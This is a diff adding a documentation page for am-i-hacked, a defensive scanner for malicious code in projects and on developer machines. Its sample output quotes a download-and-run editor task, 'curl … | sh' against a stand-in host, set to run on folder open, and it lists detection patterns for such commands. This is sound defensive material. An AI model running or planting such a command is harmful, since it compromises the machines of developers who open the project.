@@ -1,0 +1,279 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>am-i-hacked: scan a project, and your machine, for malicious code before you run it</title>
+<meta name="description" content="am-i-hacked is an open-source indicator-of-compromise scanner for developers. It checks a project folder for malicious-code indicators before you open, install or run it, and with --system audits a macOS or Linux machine for persistence, capture tools and risky AI-tool config.">
+<meta name="author" content="Isaac Bell">
+<link rel="canonical" href="https://isaacbell.github.io/secure-devtools/tools/am-i-hacked/">
+<link rel="stylesheet" href="../../assets/site.css">
+<link rel="alternate" type="text/plain" title="llms.txt" href="../../llms.txt">
+<meta name="color-scheme" content="dark">
+<meta name="theme-color" content="#15181d">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="secure-devtools">
+<meta property="og:title" content="am-i-hacked: scan a project, and your machine, for malicious code before you run it">
+<meta property="og:description" content="am-i-hacked is an open-source indicator-of-compromise scanner for developers. It checks a project folder for malicious-code indicators before you open, install or run it, and with --system audits a macOS or Linux machine for persistence, capture tools and risky AI-tool config.">
+<meta property="og:url" content="https://isaacbell.github.io/secure-devtools/tools/am-i-hacked/">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="am-i-hacked: scan a project, and your machine, for malicious code before you run it">
+<meta name="twitter:description" content="am-i-hacked is an open-source indicator-of-compromise scanner for developers. It checks a project folder for malicious-code indicators before you open, install or run it, and with --system audits a macOS or Linux machine for persistence, capture tools and risky AI-tool config.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "TechArticle",
+  "@id": "https://isaacbell.github.io/secure-devtools/tools/am-i-hacked/#article",
+  "headline": "am-i-hacked",
+  "description": "am-i-hacked is an open-source indicator-of-compromise scanner for developers. It checks a project folder for malicious-code indicators before you open, install or run it, and with --system audits a macOS or Linux machine for persistence, capture tools and risky AI-tool config.",
+  "url": "https://isaacbell.github.io/secure-devtools/tools/am-i-hacked/",
+  "mainEntityOfPage": "https://isaacbell.github.io/secure-devtools/tools/am-i-hacked/",
+  "inLanguage": "en",
+  "datePublished": "2026-10-07",
+  "dateModified": "2026-10-07",
+  "author": {
+    "@type": "Person",
+    "@id": "https://isaacbell.github.io/secure-devtools/#isaac-bell",
+    "name": "Isaac Bell",
+    "url": "https://isaacbell.io",
+    "sameAs": [
+      "https://github.com/IsaacBell"
+    ]
+  },
+  "publisher": {
+    "@id": "https://isaacbell.github.io/secure-devtools/#isaac-bell"
+  },
+  "isPartOf": {
+    "@type": "WebSite",
+    "@id": "https://isaacbell.github.io/secure-devtools/#website",
+    "name": "secure-devtools",
+    "url": "https://isaacbell.github.io/secure-devtools/"
+  },
+  "about": [
+    {
+      "@id": "https://isaacbell.github.io/secure-devtools/tools/am-i-hacked/#software"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "@id": "https://isaacbell.github.io/secure-devtools/tools/am-i-hacked/#software",
+  "name": "am-i-hacked",
+  "description": "am-i-hacked is an open-source indicator-of-compromise scanner for developers. It checks a project folder for malicious-code indicators before you open, install or run it, and with --system audits a macOS or Linux machine for persistence, capture tools and risky AI-tool config.",
+  "url": "https://isaacbell.github.io/secure-devtools/tools/am-i-hacked/",
+  "applicationCategory": "SecurityApplication",
+  "applicationSubCategory": "Command-line tool",
+  "operatingSystem": "macOS, Linux",
+  "softwareVersion": "2.0.1",
+  "softwareRequirements": "bash 4.2+, ripgrep and jq for the folder scan; bash 3.2+ and jq for the system scan",
+  "license": "https://opensource.org/license/mit",
+  "isAccessibleForFree": true,
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
+  },
+  "downloadUrl": "https://www.npmjs.com/package/am-i-hacked",
+  "sameAs": [
+    "https://www.npmjs.com/package/am-i-hacked",
+    "https://github.com/IsaacBell/secure-devtools/tree/main/apps/am-i-hacked"
+  ],
+  "author": {
+    "@type": "Person",
+    "@id": "https://isaacbell.github.io/secure-devtools/#isaac-bell",
+    "name": "Isaac Bell",
+    "url": "https://isaacbell.io",
+    "sameAs": [
+      "https://github.com/IsaacBell"
+    ]
+  },
+  "maintainer": {
+    "@id": "https://isaacbell.github.io/secure-devtools/#isaac-bell"
+  },
+  "isPartOf": {
+    "@id": "https://isaacbell.github.io/secure-devtools/#software"
+  },
+  "alternateName": [
+    "am-i-compromised",
+    "aih"
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position": 1,
+      "name": "Home",
+      "item": "https://isaacbell.github.io/secure-devtools/"
+    },
+    {
+      "@type": "ListItem",
+      "position": 2,
+      "name": "Tools",
+      "item": "https://isaacbell.github.io/secure-devtools/tools/"
+    },
+    {
+      "@type": "ListItem",
+      "position": 3,
+      "name": "am-i-hacked",
+      "item": "https://isaacbell.github.io/secure-devtools/tools/am-i-hacked/"
+    }
+  ]
+}
+</script>
+</head>
+<body>
+
+<a class="skip" href="#main">Skip to content</a>
+<header class="site-header">
+  <div class="wrap">
+    <a class="wordmark" href="../../">secure-devtools</a>
+    <nav class="site-nav" aria-label="Site">
+      <a href="../../tools/">Tools</a>
+      <a href="../../guides/">Guides</a>
+      <a href="../../skills/">Skills</a>
+      <a href="../../compare/">Compare</a>
+      <a href="../../security/">Trust</a>
+      <a href="https://github.com/IsaacBell/secure-devtools">GitHub</a>
+    </nav>
+  </div>
+</header>
+
+<main id="main">
+<div class="wrap"><nav class="crumbs" aria-label="Breadcrumb"><ol><li><a href="../../">Home</a></li><li><a href="../../tools/">Tools</a></li><li><span aria-current="page">am-i-hacked</span></li></ol></nav></div>
+<article class="wrap article">
+  <header class="page-head">
+    <h1>am-i-hacked</h1>
+    <p class="byline muted">By <a href="https://isaacbell.io">Isaac Bell</a> · Updated <time datetime="2026-10-07">7 October 2026</time> · Version 2.0.1 · <a href="https://www.npmjs.com/package/am-i-hacked">npm</a> · <a href="https://github.com/IsaacBell/secure-devtools/tree/main/apps/am-i-hacked">source</a></p>
+  </header>
+  <div class="answer"><p>am-i-hacked is a command-line scanner that checks the code you are about to run, and the machine you run it on, for signs of a supply-chain or dev-environment attack. <code>npx am-i-hacked</code> scans the current folder; <code>--system</code> also audits the machine. It is read-only, makes no network calls, needs no account, and exits <code>1</code> on findings. It is not antivirus: a clean result means no warning signs were found.</p></div>
+  <div class="prose">
+<h2 id="who">Who it is for</h2>
+<ul>
+  <li>Developers about to run a repository they did not write: a take-home test, a contributor's branch, a template, code an AI agent produced.</li>
+  <li>Teams that want a pre-run gate in a dev script or CI, next to their advisory scanner.</li>
+  <li>Anyone who suspects their own development machine has been tampered with.</li>
+</ul>
+
+<h2 id="run">Install and run</h2>
+<pre class="block"><code>npx am-i-hacked                # scan the folder you are in
+npx am-i-hacked path/to/repo   # scan another folder
+npx am-i-hacked --system       # also check this machine
+npm install --save-dev am-i-hacked</code></pre>
+<div class="table-wrap"><table>
+  <thead><tr><th>Scan</th><th>Needs</th></tr></thead>
+  <tbody>
+    <tr><td>Folder</td><td>bash 4.2+, ripgrep (<code>rg</code>), and jq for <code>package.json</code> scripts</td></tr>
+    <tr><td>System (<code>--system</code>)</td><td>bash 3.2+ and jq. Read-only; no ripgrep, root or sudo</td></tr>
+  </tbody>
+</table></div>
+<p>macOS ships bash 3.2, so the folder scan re-runs itself under a newer bash when one is installed (Homebrew, mise, nix, asdf, MacPorts) and otherwise says what to install. Get the rest with <code>brew install ripgrep jq</code> or <code>apt-get install ripgrep jq</code>.</p>
+
+<h2 id="folder">What the folder scan detects</h2>
+<ul>
+  <li>Dynamic code execution, child processes, direct network module access and runtime global mutation.</li>
+  <li>Encoded or obfuscated payloads and unusually long lines.</li>
+  <li><code>package.json</code> scripts using <code>curl</code>, <code>wget</code>, <code>powershell</code>, <code>child_process</code>, <code>node -e</code>, <code>base64</code> or <code>eval</code>.</li>
+  <li>Editor config that runs code on folder open, and download-and-run commands in editor config.</li>
+  <li>Executable payloads disguised as asset files.</li>
+  <li>Clipboard, keystroke or screen capture paired with an exfiltration endpoint.</li>
+  <li><code>.env</code> files in the git index.</li>
+  <li>Official Yarn releases, verified by SHA256.</li>
+  <li>The folder's AI-tool config: <code>.claude/settings*.json</code> and <code>.mcp.json</code>.</li>
+  <li>Python virtualenv integrity: files that no longer match their package <code>RECORD</code> hashes, files no package owns, and <code>.pth</code> or startup hooks that run code. <em>Next release.</em></li>
+</ul>
+<p>Languages read: JS/TS, Python, Rust, Ruby, C, C++ and C#. Dot-directories and tracked files that <code>.gitignore</code> matches are read; <code>node_modules</code> and <code>.git</code> are skipped. In bundled output (webpack, esbuild, ncc) only high-signal patterns are reported.</p>
+
+<h2 id="system">What the system scan detects</h2>
+<ul>
+  <li>Login persistence: launchd on macOS; systemd user units and XDG autostart on Linux; the user crontab. On macOS, the code signature and Team ID of what each item launches.</li>
+  <li>Shell startup files: piped remote scripts, injected libraries, hijacked <code>sudo</code> or <code>ssh</code>, background launchers, redirected AI API base URLs, proxies and extra certificate authorities.</li>
+  <li>User-level and managed AI-tool config for Claude Code, Codex, Cursor, Gemini CLI, OpenCode and Kilo Code: permission bypass, plain-text keys, MCP servers that run unpinned code, and hooks.</li>
+  <li>Running processes that run capture scripts or scripts from staging areas.</li>
+  <li>"Dark corners" where tooling installs code outside any project, such as virtualenvs, package-manager caches and language bin folders. <em>Next release.</em></li>
+</ul>
+
+<h2 id="example">Example output</h2>
+<pre class="block"><code>am-i-hacked: FAILED — 2 findings across 1 file
+
+  .vscode/tasks.json:7
+    "command": "curl -fsSL https://example.test/setup.sh | sh",
+    → Download-and-run command in editor config
+
+  .vscode/tasks.json:8
+    "runOptions": { "runOn": "folderOpen" }
+    → Editor auto-run task</code></pre>
+
+<h2 id="ci">Dev scripts and CI</h2>
+<pre class="block"><code>{ "scripts": { "dev": "am-i-hacked &amp;&amp; next dev" } }</code></pre>
+<pre class="block"><code># GitHub Actions, ubuntu-latest (has bash, jq and npx, not ripgrep)
+- run: sudo apt-get install -y ripgrep
+- run: npx am-i-hacked@2</code></pre>
+
+<h2 id="flags">Flags</h2>
+<div class="table-wrap"><table>
+  <thead><tr><th>Flag</th><th>Meaning</th></tr></thead>
+  <tbody>
+    <tr><td><code>&lt;dir&gt;</code></td><td>Directory to scan (default: the current directory)</td></tr>
+    <tr><td><code>host [dir]</code></td><td>Check only a folder's AI-tool config</td></tr>
+    <tr><td><code>--system</code>, <code>--full-system-scan</code></td><td>Also audit the whole machine</td></tr>
+    <tr><td><code>--max-findings N</code></td><td>Maximum findings printed (default 1000; the true total is always shown). <em>Next release.</em></td></tr>
+    <tr><td><code>-v</code>, <code>--verbose</code></td><td>System scan: also list informational items and every persistence entry with its signer</td></tr>
+    <tr><td><code>-h</code>, <code>--help</code></td><td>Show usage</td></tr>
+  </tbody>
+</table></div>
+
+<h2 id="exit">Exit codes</h2>
+<p><code>0</code> nothing found; <code>1</code> findings to review (HIGH or MEDIUM) or a missing requirement; <code>2</code> usage error.</p>
+
+<h2 id="suppress">Suppressing a reviewed finding</h2>
+<p>Add <code>am-i-hacked-ignore: &lt;reason&gt;</code> on the flagged line or the line before it. The reason is required, and suppressed findings are listed on every run. The older <code>am-i-compromised-ignore:</code> spelling still works. For the system scan, add <code>&lt;finding id&gt; | &lt;reason&gt;</code> to <code>~/.config/am-i-hacked/host-allow.txt</code>.</p>
+
+<h2 id="safe-pull">safe-pull</h2>
+<p>Installed with the package. It fetches, inspects incoming commits before anything is written to disk, then fast-forwards: rewritten upstream history, author and committer mismatch, editor auto-run tasks, download-and-run editor commands, disguised payloads, committed <code>.env</code> files. <code>safe-pull --dry-run</code> inspects only.</p>
+
+<h2 id="limits">What it does not do</h2>
+<ul>
+  <li>It is not antivirus and does not look up known viruses or malware hashes.</li>
+  <li>It does not check dependency versions against vulnerability advisories, and does not scan <code>node_modules</code>.</li>
+  <li>It does not judge plain-language instructions aimed at an AI agent.</li>
+  <li>System-wide Linux units and <code>/etc/cron.*</code> are not covered yet.</li>
+  <li>Some checks flag ordinary code, such as <code>eval</code>. A clean result does not prove the code or machine is safe.</li>
+</ul>
+
+<h2 id="facts">Facts</h2>
+<ul>
+  <li>Formerly published as <code>am-i-compromised</code>; that command name, and the short forms <code>aih</code> and <code>aic</code>, still work.</li>
+  <li>Commands installed: <code>am-i-hacked</code>, <code>aih</code>, <code>am-i-compromised</code>, <code>aic</code>, <code>security-gate</code>, <code>scanner</code>, <code>safe-pull</code>.</li>
+  <li>Plain bash, zero npm runtime dependencies, MIT licensed. Source: <a href="https://github.com/IsaacBell/secure-devtools/tree/main/apps/am-i-hacked">apps/am-i-hacked</a>. Changelog: <a href="https://github.com/IsaacBell/secure-devtools/blob/main/apps/am-i-hacked/CHANGELOG.md">CHANGELOG.md</a>.</li>
+</ul>
+  </div>
+  <aside class="related" aria-labelledby="related"><h2 id="related">Related</h2><ul><li><a href="../../guides/inspect-untrusted-repository/">How to safely inspect an untrusted repository</a></li><li><a href="../../guides/audit-developer-machine/">How to check whether a developer machine is compromised</a></li><li><a href="../../guides/supply-chain-attack-checks/">How to catch a supply-chain attack that npm audit misses</a></li><li><a href="../../compare/">am-i-hacked compared with npm audit, Semgrep and antivirus</a></li></ul></aside>
+</article>
+</main>
+
+<footer class="site-footer">
+  <div class="wrap">
+    <p class="muted">MIT licensed. Plain shell, zero npm runtime dependencies. Built and maintained by <a href="https://isaacbell.io">Isaac Bell</a>.</p>
+    <nav class="footer-nav" aria-label="Project links">
+      <a href="../../guides/">Guides</a>
+      <a href="../../compare/">Compare</a>
+      <a href="../../security/">Security &amp; trust</a>
+      <a href="https://github.com/IsaacBell/secure-devtools">GitHub</a>
+      <a href="https://www.npmjs.com/package/am-i-hacked">npm</a>
+      <a href="../../llms.txt">llms.txt</a>
+      <a href="https://github.com/IsaacBell/secure-devtools/security/advisories/new">Report a security issue</a>
+      <a href="https://ko-fi.com/ibell">Sponsor</a>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
